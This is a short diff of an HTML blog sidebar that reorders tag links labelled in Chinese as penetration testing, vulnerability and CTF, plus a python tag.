-        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
+        <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
     
         <span class="sidebar-tag-name" data-tags="漏洞"><span class="iconfont-archer">&#xe606;</span>漏洞</span>
     
-        <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
+        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
     
         <span class="sidebar-tag-name" data-tags="CTF、漏洞"><span class="iconfont-archer">&#xe606;</span>CTF、漏洞</span>
     
